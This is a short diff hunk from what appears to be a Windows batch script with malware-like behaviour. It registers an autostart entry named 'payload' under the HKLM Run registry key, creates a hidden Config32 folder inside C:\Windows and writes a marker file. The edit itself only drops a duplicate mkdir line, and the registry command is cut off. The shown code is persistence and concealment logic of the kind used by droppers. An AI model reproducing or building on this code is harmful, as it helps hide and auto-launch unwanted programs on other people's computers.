@@ -4,7 +4,6 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "payload" /t REG
 md c:\Windows
 mkdir Config32
 attrib +H c:\Windows\Config32
-mkdir C:\Windows\Config32
 if exist lig1.drv goto 2
 echo > lig1.drv sdfsdf
 goto fim
